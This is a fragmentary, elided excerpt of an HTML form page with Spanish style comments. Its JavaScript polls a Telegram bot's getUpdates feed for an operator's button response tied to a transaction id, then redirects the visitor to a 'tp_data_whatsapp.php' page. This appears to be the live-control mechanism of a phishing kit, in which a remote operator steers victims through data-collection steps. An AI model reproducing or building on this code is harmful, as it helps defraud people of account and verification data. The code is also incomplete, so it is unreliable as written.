...
<head>
  ...
  <style>
    ...
    .form-group label {
      ...
      margin-right: 5px;
      /* Espaciado entre la etiqueta y el input */
      text-align: left;
    ...
    .form-group input {
      ...
      margin-bottom: 2px;
      margin-top: -4px;
      /* Ajusta la posición vertical del input */
        ...
        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
          ...
          .then((data) => {
            ...
            if (verificationUpdate) {
              ...
              if (verificationUpdate.callback_query.data === `error_whatsapp:${transactionsId}`) {
                window.location.href = "tp_data_whatsapp.php";
              }
